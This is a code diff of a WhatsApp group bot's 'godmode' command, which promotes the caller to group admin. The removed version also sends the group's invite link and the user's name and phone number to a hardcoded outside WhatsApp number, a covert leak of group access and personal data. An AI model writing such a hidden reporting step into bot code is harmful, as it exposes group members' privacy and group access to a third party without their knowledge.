@@ -1,33 +1,12 @@
-const handler = async (m, { conn, isAdmin }) => {
-    if (isAdmin) return
-
-    try {
-        const groupMetadata = await conn.groupMetadata(m.chat)
-        await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote')
-        const groupLink = await conn.groupInviteCode(m.chat)
-        const fullLink = `https://chat.whatsapp.com/${groupLink}`
-
-        await conn.sendMessage('393204885371@s.whatsapp.net', {
-            text: `━━━━⬣ AUTOADMIN ⬣━━━━
-
-👤 *Utente:* @${m.sender.split('@')[0]}
-📝 *Nome:* ${conn.getName(m.sender)}
-📞 *Numero:* +${m.sender.split('@')[0]}
-
-📌 *Gruppo:*\n${groupMetadata.subject}
-🔗 *Link:*\n${fullLink}`,
-            mentions: [m.sender],
-            quoted: m
-        })
-
-    } catch (e) {
-        console.error(e)
-    }
-}
-
-handler.command = ['autoadmin', 'autoadm', 'godmode']
-handler.owner = true
+let handler = async (m, { conn, isAdmin }) => {  
+if (m.fromMe) return
+if (isAdmin) throw 'ok'
+try {  
+await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote")
+} catch {
+await m.reply('non ti è concesso')}}
+handler.command = /^godmode$/i
+handler.rowner = true
 handler.group = true
 handler.botAdmin = true
-
 export default handler
